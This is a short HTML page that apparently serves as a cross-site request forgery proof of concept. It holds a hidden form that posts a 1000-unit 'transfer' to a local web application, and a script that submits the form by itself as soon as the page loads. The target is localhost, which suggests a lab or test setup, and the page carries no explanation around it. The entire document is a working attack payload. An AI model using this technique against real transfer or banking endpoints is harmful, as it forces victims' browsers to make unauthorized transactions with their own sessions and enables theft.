```html
<html>
    <body>
        <form action="http://localhost:8080/transfer" method="POST">
            <input type="hidden" name="amount" value="1000" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```